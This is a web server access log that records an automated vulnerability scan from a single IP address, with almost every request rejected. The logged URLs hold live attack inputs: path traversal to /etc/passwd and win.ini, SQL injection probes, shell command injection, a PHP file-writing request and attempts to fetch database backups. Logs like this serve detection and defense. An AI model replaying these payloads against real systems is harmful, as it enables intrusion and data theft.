127.0.0.1 - - [18/Mar/2025:09:58:21 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:13 +0900] "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:58:14 +0900] "GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../Windows/win.ini HTTP/1.1" 404 770
35.80.142.130 - - [18/Mar/2025:10:58:14 +0900] "GET /app/kibana HTTP/1.1" 404 745
35.80.142.130 - - [18/Mar/2025:10:58:14 +0900] "POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1" 404 749
35.80.142.130 - - [18/Mar/2025:10:58:14 +0900] "GET /db.zip HTTP/1.1" 404 737
35.80.142.130 - - [18/Mar/2025:10:58:14 +0900] "GET /htmltopdf/downfile.php?filename=/windows/win.ini HTTP/1.1" 404 757
35.80.142.130 - - [18/Mar/2025:10:58:14 +0900] "GET /appmonitor/protected/selector/server_file/files?folder=C://&suffix= HTTP/1.1" 404 794
35.80.142.130 - - [18/Mar/2025:10:58:15 +0900] "GET //ckeditor/samples/sample_posteddata.php HTTP/1.1" 404 782
35.80.142.130 - - [18/Mar/2025:10:58:15 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:15 +0900] "GET /api/v1/nodes HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:58:15 +0900] "GET /hosts HTTP/1.1" 404 736
35.80.142.130 - - [18/Mar/2025:10:58:15 +0900] "POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1" 404 764
35.80.142.130 - - [18/Mar/2025:10:58:15 +0900] "GET /../conf/config.properties HTTP/1.1" 400 764
35.80.142.130 - - [18/Mar/2025:10:58:15 +0900] "POST / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:15 +0900] "POST /_ignition/execute-solution HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:58:16 +0900] "GET /storage/logs/laravel.log HTTP/1.1" 404 763
35.80.142.130 - - [18/Mar/2025:10:58:16 +0900] "GET /api/v1/authentication/connection-token/ HTTP/1.1" 404 786
35.80.142.130 - - [18/Mar/2025:10:58:16 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:16 +0900] "GET /axis/services/FreeMarkerService HTTP/1.1" 404 770
35.80.142.130 - - [18/Mar/2025:10:58:16 +0900] "POST /extend/Qcloud/Sms/Sms.php HTTP/1.1" 404 768
35.80.142.130 - - [18/Mar/2025:10:58:16 +0900] "GET /admin/?n=product&c=product_admin&a=dopara&app_type=shop&id=1%20union%20SELECT%201,2,3,43936*41017,5,6,7%20limit%205,1%20%23 HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:16 +0900] "GET /database.zip HTTP/1.1" 404 743
35.80.142.130 - - [18/Mar/2025:10:58:17 +0900] "GET /include/thumb.php?dir=http/.....///.....///config/config_db.php HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:17 +0900] "POST /admin/?n=language&c=language_general&a=doExportPack HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:17 +0900] "GET /admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+40415*43986,1--+&site=admin HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:17 +0900] "GET //editor/ckeditor/samples/sample_posteddata.php HTTP/1.1" 404 793
35.80.142.130 - - [18/Mar/2025:10:58:17 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:17 +0900] "POST /minio/webrpc HTTP/1.1" 404 747
35.80.142.130 - - [18/Mar/2025:10:58:18 +0900] "GET /appmonitor/protected/selector/server_file/files?folder=/&suffix= HTTP/1.1" 404 794
35.80.142.130 - - [18/Mar/2025:10:58:18 +0900] "GET /images/lists?cid=1%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,md5(941105510)))%20desc%20--+a HTTP/1.1" 404 747
35.80.142.130 - - [18/Mar/2025:10:58:18 +0900] "GET /nagiosql/admin/commandline.php?cname=%27%20union%20select%20concat(md5(2091291874))%23 HTTP/1.1" 404 769
35.80.142.130 - - [18/Mar/2025:10:58:18 +0900] "GET /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:18 +0900] "POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1" 404 764
35.80.142.130 - - [18/Mar/2025:10:58:18 +0900] "GET /index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1 HTTP/1.1" 404 771
35.80.142.130 - - [18/Mar/2025:10:58:18 +0900] "GET /nagiosql/admin/info.php?key1=%27%20union%20select%20concat(md5(2097013460))%23 HTTP/1.1" 404 762
35.80.142.130 - - [18/Mar/2025:10:58:18 +0900] "POST /nagiosql/admin/logbook.php HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:58:19 +0900] "GET /axis/services/AdminService HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:58:19 +0900] "GET /download.php?file=../../../../../etc/passwd HTTP/1.1" 404 743
35.80.142.130 - - [18/Mar/2025:10:58:19 +0900] "POST /nagiosql/admin/menuaccess.php HTTP/1.1" 404 768
35.80.142.130 - - [18/Mar/2025:10:58:19 +0900] "GET /ftp.zip HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:58:19 +0900] "GET /_next/../../../../../../../../../../etc/passwd HTTP/1.1" 400 764
35.80.142.130 - - [18/Mar/2025:10:58:19 +0900] "POST /user/login/checkPermit HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:58:19 +0900] "POST /directdata/direct/router HTTP/1.1" 404 763
35.80.142.130 - - [18/Mar/2025:10:58:20 +0900] "POST /passwordrecovered.cgi?id=get_rekt HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:20 +0900] "POST /service/extdirect HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:20 +0900] "POST /minio/webrpc HTTP/1.1" 404 747
35.80.142.130 - - [18/Mar/2025:10:58:20 +0900] "POST /rest/beta/repositories/go/group HTTP/1.1" 404 778
35.80.142.130 - - [18/Mar/2025:10:58:20 +0900] "POST /extdirect HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:20 +0900] "GET //fck/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php HTTP/1.1" 404 839
35.80.142.130 - - [18/Mar/2025:10:58:20 +0900] "GET /service/local/authentication/login HTTP/1.1" 404 777
35.80.142.130 - - [18/Mar/2025:10:58:21 +0900] "POST /.%0d./.%0d./.%0d./.%0d./bin/sh%20HTTP/1.0 HTTP/1.1" 404 796
35.80.142.130 - - [18/Mar/2025:10:58:21 +0900] "GET /../../../../../../../../windows/win.ini HTTP/1.1" 400 764
35.80.142.130 - - [18/Mar/2025:10:58:21 +0900] "GET /ui_base/js/..%2f..%2f..%2f..%2fsettings.js HTTP/1.1" 400 827
35.80.142.130 - - [18/Mar/2025:10:58:21 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:21 +0900] "GET /css_parser.php?css=css_parser.php HTTP/1.1" 404 745
35.80.142.130 - - [18/Mar/2025:10:58:21 +0900] "POST /login/verify HTTP/1.1" 404 747
35.80.142.130 - - [18/Mar/2025:10:58:22 +0900] "GET /webapi/v1/system/accountmanage/account HTTP/1.1" 404 785
35.80.142.130 - - [18/Mar/2025:10:58:22 +0900] "GET /admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php HTTP/1.1" 404 758
35.80.142.130 - - [18/Mar/2025:10:58:22 +0900] "GET /getFavicon?host=baidu.com/? HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:22 +0900] "GET /base_import/static/c:/windows/win.ini HTTP/1.1" 404 784
35.80.142.130 - - [18/Mar/2025:10:58:22 +0900] "POST /login/userverify.cgi HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:22 +0900] "GET /admin.zip HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:22 +0900] "GET /s/opentsdb_header.jpg HTTP/1.1" 404 756
35.80.142.130 - - [18/Mar/2025:10:58:23 +0900] "GET /data/pbootcms.db HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:58:23 +0900] "POST /login/userverify.cgi HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:23 +0900] "GET //fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellcheckder.php HTTP/1.1" 404 846
35.80.142.130 - - [18/Mar/2025:10:58:23 +0900] "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:23 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:24 +0900] "GET /api.php?c=project&f=index&token=1234&id=news&sort=1%20and%20extractvalue(1,concat(0x7e,md5(923035368)))%20--+ HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:58:24 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:24 +0900] "GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:24 +0900] "POST /scripts/setup.php HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:24 +0900] "GET /index.php HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:24 +0900] "GET /89227743.php HTTP/1.1" 404 743
35.80.142.130 - - [18/Mar/2025:10:58:24 +0900] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 805
35.80.142.130 - - [18/Mar/2025:10:58:25 +0900] "POST /upload/UploadResourcePic.ashx?ResourceID=1816 HTTP/1.1" 404 764
35.80.142.130 - - [18/Mar/2025:10:58:25 +0900] "GET /new/newhttps:/baidu.com HTTP/1.1" 404 762
35.80.142.130 - - [18/Mar/2025:10:58:25 +0900] "GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1" 400 764
35.80.142.130 - - [18/Mar/2025:10:58:25 +0900] "GET /base_import/static/etc/passwd HTTP/1.1" 404 772
35.80.142.130 - - [18/Mar/2025:10:58:25 +0900] "GET /upload.zip HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:25 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:25 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:25 +0900] "POST /debug/pyspidervulntest/run HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:58:26 +0900] "GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:58:26 +0900] "POST /photo/p/api/album.php HTTP/1.1" 404 764
35.80.142.130 - - [18/Mar/2025:10:58:26 +0900] "GET /assets/file:%2f%2f/etc/passwd HTTP/1.1" 400 827
35.80.142.130 - - [18/Mar/2025:10:58:26 +0900] "GET /install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3Bexpr%20810723133%20%2B%20804457609%20%20%23 HTTP/1.1" 404 793
35.80.142.130 - - [18/Mar/2025:10:58:26 +0900] "GET /tests/generate.php HTTP/1.1" 404 753
35.80.142.130 - - [18/Mar/2025:10:58:26 +0900] "GET /api/whoami HTTP/1.1" 404 745
35.80.142.130 - - [18/Mar/2025:10:58:26 +0900] "GET /%20../web-inf/ HTTP/1.1" 404 753
35.80.142.130 - - [18/Mar/2025:10:58:27 +0900] "GET /index.html HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:27 +0900] "POST /login.php HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:27 +0900] "POST /index.php?action=login.index&host=0 HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:27 +0900] "GET /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp HTTP/1.1" 404 794
35.80.142.130 - - [18/Mar/2025:10:58:27 +0900] "GET /resin-doc/viewfile/?file=index.jsp HTTP/1.1" 404 758
35.80.142.130 - - [18/Mar/2025:10:58:27 +0900] "POST /guest_auth/guestIsUp.php HTTP/1.1" 404 759
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "POST /login.php HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "POST /login.php HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "GET /login.php HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "POST /WEB_VMS/LEVEL15/ HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "GET /package.zip HTTP/1.1" 404 742
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "GET /common/download/resource?resource=/profile/../../../../etc/passwd HTTP/1.1" 404 763
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "GET /run HTTP/1.1" 404 734
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "POST /(download)/tmp/1.txt HTTP/1.1" 404 759
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "POST /(download)/tmp/lqxagrwm.txt HTTP/1.1" 404 766
35.80.142.130 - - [18/Mar/2025:10:58:28 +0900] "POST /main.ehp HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:58:29 +0900] "GET /ui/login.php?user=admin HTTP/1.1" 404 747
35.80.142.130 - - [18/Mar/2025:10:58:29 +0900] "GET /89227743.php HTTP/1.1" 404 743
35.80.142.130 - - [18/Mar/2025:10:58:29 +0900] "GET /report/download.php?pdf=../../../../../etc/hosts HTTP/1.1" 404 754
35.80.142.130 - - [18/Mar/2025:10:58:29 +0900] "GET /tool/log/c.php?strip_slashes=md5&host=gholzhjj HTTP/1.1" 404 753
35.80.142.130 - - [18/Mar/2025:10:58:29 +0900] "POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1" 404 791
35.80.142.130 - - [18/Mar/2025:10:58:29 +0900] "GET /tool/log/c.php?strip_slashes=printf&host=yhdzfswh%25%25mumxnzde HTTP/1.1" 404 753
35.80.142.130 - - [18/Mar/2025:10:58:30 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:30 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:30 +0900] "POST /search.php?print(870851981%2b851880993) HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:30 +0900] "POST /search.php HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:30 +0900] "POST /cgi-bin/libagent.cgi?type=J HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:30 +0900] "POST /search.php?searchtype=5 HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /old.zip HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0 HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /login.html HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(203215436)) HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 404 789
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /index.php HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /seeyon/management/index.jsp HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "POST /seeyon/thirdpartyController.do HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /common/download/resource?resource=/profile/../../../../Windows/win.ini HTTP/1.1" 404 763
35.80.142.130 - - [18/Mar/2025:10:58:31 +0900] "GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:58:32 +0900] "POST /seeyon/thirdpartyController.do HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:58:32 +0900] "GET /yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5(202443590),7-- HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:58:32 +0900] "GET /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:32 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:32 +0900] "GET /test.zip HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:58:32 +0900] "GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(207950048),0x7e),1) HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:33 +0900] "GET /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20union%20all%20select%201,2,@@version,md5(203244493)%23 HTTP/1.1" 404 778
35.80.142.130 - - [18/Mar/2025:10:58:33 +0900] "GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:58:33 +0900] "POST /server/index.php?s=/api/user/login HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:58:33 +0900] "POST /index.php?s=/home/page/uploadImg HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:33 +0900] "POST /graphql HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:58:33 +0900] "GET /web.config.i18n.ashx?l=en-US&v=865067503 HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:58:33 +0900] "GET /solr/admin/cores?wt=json HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:34 +0900] "GET /api/settings/values HTTP/1.1" 404 758
35.80.142.130 - - [18/Mar/2025:10:58:34 +0900] "GET /cgi-bin/jarrewrite.sh HTTP/1.1" 404 756
35.80.142.130 - - [18/Mar/2025:10:58:34 +0900] "GET /solr/admin/cores?indexInfo=false&wt=json HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:34 +0900] "GET /v1/submissions HTTP/1.1" 404 749
35.80.142.130 - - [18/Mar/2025:10:58:34 +0900] "GET /solr/admin/cores?wt=json HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:34 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:35 +0900] "POST /php/ping.php HTTP/1.1" 404 747
35.80.142.130 - - [18/Mar/2025:10:58:35 +0900] "HEAD /actuator/heapdump HTTP/1.1" 404 -
35.80.142.130 - - [18/Mar/2025:10:58:35 +0900] "GET /a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/resolv.conf HTTP/1.1" 404 816
35.80.142.130 - - [18/Mar/2025:10:58:35 +0900] "GET /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/a HTTP/1.1" 404 831
35.80.142.130 - - [18/Mar/2025:10:58:35 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:35 +0900] "GET /root.zip HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:58:35 +0900] "GET /public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ= HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:58:36 +0900] "GET /test/pathtraversal/master/..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fpasswd HTTP/1.1" 404 825
35.80.142.130 - - [18/Mar/2025:10:58:36 +0900] "GET /manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../ HTTP/1.1" 404 754
35.80.142.130 - - [18/Mar/2025:10:58:36 +0900] "POST / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:36 +0900] "GET /env HTTP/1.1" 404 734
35.80.142.130 - - [18/Mar/2025:10:58:36 +0900] "GET /1.sql HTTP/1.1" 404 736
35.80.142.130 - - [18/Mar/2025:10:58:36 +0900] "GET /solr/admin/cores?indexInfo=false&wt=json HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:36 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:36 +0900] "GET /swagger/ui/index HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:37 +0900] "POST / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:37 +0900] "GET /api/ping?count=5&host=;echo%20$(expr%20860532794%20%2b%20869523542):860532794:860532794;&port=80&source=1.1.1.1&type=icmp HTTP/1.1" 404 743
35.80.142.130 - - [18/Mar/2025:10:58:37 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:37 +0900] "GET /manager/index.php HTTP/1.1" 403 3529
35.80.142.130 - - [18/Mar/2025:10:58:37 +0900] "GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=(expr%20838155464%20%2B%20821688911)%3Eeonezsxkov HTTP/1.1" 404 757
35.80.142.130 - - [18/Mar/2025:10:58:37 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:37 +0900] "GET /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34 HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:37 +0900] "GET /log/view?filename=/windows/win.ini&base=../../../../../../../../../../ HTTP/1.1" 404 743
35.80.142.130 - - [18/Mar/2025:10:58:37 +0900] "GET /?a=display&templateFile=README.md HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:38 +0900] "GET /beifen.zip HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:38 +0900] "GET /backup.sql HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:38 +0900] "GET /index.php?a=fetch&content=%3C?php+file_put_contents(%2211282.php%22,%22%3C?php+echo+1163526309%3B%22)%3B HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:38 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:39 +0900] "GET /actuator/env HTTP/1.1" 404 747
35.80.142.130 - - [18/Mar/2025:10:58:39 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:39 +0900] "GET /swagger-ui.html HTTP/1.1" 404 746
35.80.142.130 - - [18/Mar/2025:10:58:39 +0900] "GET /864448757.php HTTP/1.1" 404 744
35.80.142.130 - - [18/Mar/2025:10:58:39 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:39 +0900] "POST /index.php?s=captcha HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:39 +0900] "GET /api/dbstat/gettablessize HTTP/1.1" 404 763
35.80.142.130 - - [18/Mar/2025:10:58:40 +0900] "GET /jkstatus; HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:40 +0900] "PUT /lfgmeb.jsp/ HTTP/1.1" 405 633
35.80.142.130 - - [18/Mar/2025:10:58:40 +0900] "GET /manager/html HTTP/1.1" 403 3529
35.80.142.130 - - [18/Mar/2025:10:58:40 +0900] "GET /121.134.99.130.zip HTTP/1.1" 404 749
35.80.142.130 - - [18/Mar/2025:10:58:40 +0900] "POST /general/document/index.php/recv/register/insert HTTP/1.1" 404 798
35.80.142.130 - - [18/Mar/2025:10:58:40 +0900] "GET /manage/log/view?filename=/etc/hosts&base=../../../../../../../../../../ HTTP/1.1" 404 754
35.80.142.130 - - [18/Mar/2025:10:58:40 +0900] "GET /general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay HTTP/1.1" 404 784
35.80.142.130 - - [18/Mar/2025:10:58:40 +0900] "POST /mobile/api/api.ali.php HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:58:40 +0900] "GET /database.sql HTTP/1.1" 404 743
35.80.142.130 - - [18/Mar/2025:10:58:41 +0900] "GET /11282.php HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:41 +0900] "GET /mobile/auth_mobi.php?isAvatar=1&uid=11121212121212&P_VER=0 HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:41 +0900] "POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1" 404 779
35.80.142.130 - - [18/Mar/2025:10:58:41 +0900] "GET /index.php/Home/uploadify/fileList?type=.+&path=../ HTTP/1.1" 404 776
35.80.142.130 - - [18/Mar/2025:10:58:41 +0900] "GET /mobile/index/index2/id/1)%20and%20(select%201%20from%20(select%20count(*),concat(0x716b627671,(select%20md5(868958619)),0x716b627671,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)-- HTTP/1.1" 404 955
35.80.142.130 - - [18/Mar/2025:10:58:41 +0900] "POST /index.php?s=captcha HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:41 +0900] "GET /api/swagger-ui.html HTTP/1.1" 404 754
35.80.142.130 - - [18/Mar/2025:10:58:42 +0900] "POST /install.php?finish HTTP/1.1" 404 742
35.80.142.130 - - [18/Mar/2025:10:58:42 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:42 +0900] "GET /Pages/login.htm HTTP/1.1" 404 750
35.80.142.130 - - [18/Mar/2025:10:58:42 +0900] "GET /ueditor/net/controller.ashx?action=catchimage&encode=utf-8 HTTP/1.1" 404 766
35.80.142.130 - - [18/Mar/2025:10:58:42 +0900] "GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1" 400 827
35.80.142.130 - - [18/Mar/2025:10:58:43 +0900] "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 404 783
35.80.142.130 - - [18/Mar/2025:10:58:43 +0900] "GET /log/view?filename=/etc/hosts&base=../../../../../../../../../../ HTTP/1.1" 404 743
35.80.142.130 - - [18/Mar/2025:10:58:43 +0900] "POST / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:43 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:43 +0900] "GET /sql.7z HTTP/1.1" 404 737
